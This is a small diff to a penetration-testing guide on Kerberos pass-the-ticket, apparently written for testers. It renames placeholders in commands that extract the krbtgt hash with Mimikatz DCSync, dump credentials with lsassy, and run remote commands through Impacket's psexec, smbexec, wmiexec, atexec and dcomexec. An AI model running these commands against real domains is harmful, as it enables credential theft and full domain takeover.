@@ -96,7 +96,7 @@ lsassy -k $TARGETS
 On Windows, once the ticket is injected, it will natively be used when accessing a service, for example with [Mimikatz](https://github.com/gentilkiwi/mimikatz) to extract the `krbtgt` hash with [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync).
 
 ```bash
-lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
+lsadump::dcsync /dc:$DC_HOST /domain:$DOMAIN /user:krbtgt
 ```
 
 
@@ -105,11 +105,11 @@ lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
 Some [Impacket](https://github.com/SecureAuthCorp/impacket) scripts (Python) enable testers to execute commands on target systems with Kerberos support.
 
 ```bash
-psexec.py -k 'DOMAIN/USER@TARGET'
-smbexec.py -k 'DOMAIN/USER@TARGET'
-wmiexec.py -k 'DOMAIN/USER@TARGET'
-atexec.py -k 'DOMAIN/USER@TARGET'
-dcomexec.py -k 'DOMAIN/USER@TARGET'
+psexec.py -k "$DOMAIN/$USER@$TARGET"
+smbexec.py -k "$DOMAIN/$USER@$TARGET"
+wmiexec.py -k "$DOMAIN/$USER@$TARGET"
+atexec.py -k "$DOMAIN/$USER@$TARGET"
+dcomexec.py -k "$DOMAIN/$USER@$TARGET"
 ```
 
 [NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets
